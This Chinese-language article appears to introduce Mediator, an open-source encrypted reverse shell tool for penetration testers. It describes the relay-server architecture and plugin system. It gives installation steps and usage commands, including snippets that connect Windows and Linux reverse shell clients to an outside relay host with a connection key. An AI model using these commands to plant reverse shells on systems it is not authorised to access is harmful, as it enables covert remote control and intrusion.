![](https://image.3001.net/images/20210525/1621893997_60ac236ddfe5b423f111f.png!small)

## 关于Mediator

Mediator是一款功能强大的端到端加密反向Shell，该工具能够帮助研究人员跟一台“Mediator”服务器通过一个Shell连接起来，这样就不需要研究人员或处理程序设置端口转发来监听连接。除此之外，Mediator还允许我们创建插件来扩展反向Shell的功能。

广大研究人员可以将Mediator的脚本作为独立的可执行文件运行，也可以将它们导入到其他渗透测试工具或事件响应工具中使用。

## Mediator架构

受端到端加密聊天应用程序的启发，Mediator对反向Shell的客户端/服务器端模型采用了独特的方法。Mediator使用了：

> 一个客户端反向Shell；
>
> 一个客户端处理器/操作方；
>
> 一台用于桥接两条连接的服务器；

反向shell和处理程序使用了一个连接密钥连接到中介服务器。服务器在端口80上侦听处理程序连接，在端口443上侦听反向Shell连接。当客户端连接至中介服务器之后，服务器会根据客户端各自的类型和连接密钥对其进行排队。

当反向Shell和操作方都使用相同的密钥连接到服务器时，服务器将桥接这两个连接。此时，两台客户端之间会进行密钥交换，反向Shell和操作方之间的所有通信都是端到端加密的，这样也确保了服务器不能窥探它正在传输的流数据。

## 插件系统

Mediator的插件系统允许我们添加额外的命令，这些命令可以在操作方的主机、目标主机或两者同时执行代码！

## 工具说明

### 服务器端

客户端脚本可以在Windows或Linux系统平台上运行，但你需要在一台Linux主机上配置并运行服务器（[
_mediator.py_](https://github.com/doctormay6/mediator/blob/main/mediator.py)）。服务器端采用纯Python开发，因此不需要任何其他的依赖环境，广大研究人员可以使用下列命令开启服务器端脚本：

    
    
    $ python3 mediator.py

或者，你也可以使用提供的[
_Dockerfile_](https://github.com/doctormay6/mediator/blob/main/Dockerfile)来构建一个Docker镜像，并在一个容器中运行Mediator。

### 客户端

你需要安装[
_requirements.txt_](https://github.com/doctormay6/mediator/blob/main/requirements.txt)文件中定义的依赖组件，运行下列命令即可：

    
    
    $ pip3 install -r requirements.txt

处理程序和反向Shell可以在其他脚本中运行，或直接通过命令行运行。在任意情况下，脚本都可以接收服务器地址和连接密钥作为输入参数。

## Mediator服务器地址

对于Python脚本的运行，Mediator主机的地址需要通过下列参数进行初始化：

 **Handler类：**

    
    
    from handler import Handler
    
    operator = Handler(mediatorHost="example.com")
    
    operator.run()

 **WindowsRShell类：**

    
    
    from windowsTarget import WindowsRShell
    
    shell = WindowsRShell(mediatorHost="example.com")
    
    shell.run()

如果直接从一个Shell运行客户端脚本，你可以在脚本的底部硬编码进服务器端地址，或者通过-s或--server选项来指定服务器地址：

 **handler.py：**

    
    
    $ python3 handler.py -s example.com

 **windowsTarget.py：**

    
    
    > python windowsTarget.py -s example.com

## 连接密钥

当两个处理程序或两个反向Shell使用相同的连接密钥连接至Mediator服务器时，只有第一个连接会被加入等待队列中。在排队的连接超时（30秒）或与对应的连接匹配之前，尝试使用相同连接密钥连接的所有其他相同类型的客户端都将被丢弃。

重要的是要确保每个处理程序都使用唯一的连接密钥，以避免竞争条件导致错误的Shell被提供给操作方。

服务器端只接收以"#!ConnectionKey_"为前缀的密钥，默认密钥为"#!ConnectionKey_CHANGE_ME!!!"。

如需修改连接密钥，可以选择在实例化时进行设置：

 **Handler类：**

    
    
    from handler import Handler
    operator = Handler(mediatorHost="example.com", connectionKey="#!ConnectionKey_secret_key")
    
    operator.run()

 **LinuxRShel类：**

    
    
    from linuxTarget import LinuxRShell
    shell = LinuxRShell(mediatorHost="example.com", connectionKey="#!ConnectionKey_secret_key")
    
    shell.run()

如果直接从一个Shell执行客户端脚本，则可以直接在脚本末尾硬编码进连接密钥，或者通过-c或--connection-key参数指定连接密钥：

 **handler.py：**

    
    
    $ python3 handler.py -s example.com -c '#!ConnectionKey_secret_key'

 **windowsTarget.py：**

    
    
    > python windowsTarget.py -s example.com -c '#!ConnectionKey_secret_key'

## 项目地址

Mediator：【[ _GitHub传送门_](https://github.com/doctormay6/mediator)】

